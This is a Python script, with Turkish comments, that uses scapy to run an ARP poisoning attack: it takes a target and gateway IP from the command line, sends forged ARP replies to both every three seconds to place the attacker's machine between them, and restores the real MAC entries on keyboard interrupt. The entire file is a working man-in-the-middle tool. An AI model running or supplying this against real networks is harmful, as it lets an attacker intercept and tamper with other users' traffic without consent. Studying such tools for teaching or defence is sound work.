import scapy.all as scapy
import time
import optparse

def get_mac_address (ip):
    arp_request_packet = scapy.ARP(pdst=ip) #ARP cevabi olusturma
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet,timeout=1,verbose = False)[0]


    return answered_list[0][1].hwsrc #gelen cevaptan sadece maci dondurme

def arp_poisoning(target_ip,poisoned_ip):
    target_mac =get_mac_address(target_ip)

    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip) #Hedef ip ve Modemi kandirma
    scapy.send(arp_response,verbose=False)
    #scapy.ls(scapy.ARP())
def reset_operation(fooled_ip,gateway_ip): #kandirilmis ip ve modem ip
    fooled_mac=get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip) #gercek mac degeri

    arp_response = scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac,psrc=gateway_ip,hwsrc=gateway_mac) #Hedef ip ve Modemi gercek degerine dondurme
    scapy.send(arp_response,verbose=False,count=6)


def get_user_input():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t","--target",dest="target_ip",help="Target ip girin")
    parse_object.add_option("-g","--gateway-",dest="gateway_ip",help="Gateway ip girin")

    options = parse_object.parse_args()[0]

    if not options.target_ip:  #target ip alinmis mi kontrol
        print("Target ip gir")

    if not options.gateway_ip:
        print("Gateway ip gir")

    return options
number = 0

#Kullanicidan alacagımiz inputlar
user_ips = get_user_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip

try:
    while True: #Sonsuz Dongu ile gonderiyor kopmasin diye
        arp_poisoning(user_target_ip,user_gateway_ip) #modeme kendimi tanitma
        arp_poisoning(user_gateway_ip,user_target_ip)

        number += 2

        print("\rPaket Gonderiliyor " +str(number),end= "") #kac paket gonderildigi

        time.sleep(3)

except KeyboardInterrupt:  #Klavyeden basarak durdurulsa

    print("\nKapat ve Resetle ")
    reset_operation(user_target_ip,user_gateway_ip)
    reset_operation(user_gateway_ip,user_target_ip)